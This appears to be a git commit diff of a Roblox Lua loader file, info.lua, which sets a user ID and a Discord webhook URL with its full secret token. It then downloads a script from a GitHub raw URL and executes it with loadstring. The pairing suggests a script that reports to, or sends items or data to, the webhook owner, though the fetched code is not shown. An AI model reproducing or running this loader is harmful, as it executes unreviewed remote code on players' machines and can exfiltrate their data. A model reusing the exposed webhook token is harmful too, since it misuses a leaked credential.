4bb49df49252e7d331c13e4e5b5dce8a9298eeb8
Maset0 <120063355+Maset0@users.noreply.github.com>
2022-12-12 23:39:04 +0200

    Update info.lua

--- info.lua
+++ info.lua
@@ -1,3 +1,3 @@
 _G.UserID = 2557600841
 _G.WebHook = "https://discord.com/api/webhooks/1051887678775365642/haAC60f7cl3q_HKc9wDH3be0LcZwYpz861W2BteTBV4ymfWVAJhJsYcdwcEGyiOcFluf"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Maset0/PSX/Scripts/info.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Maset0/PSX/Scripts/info1.lua'))()
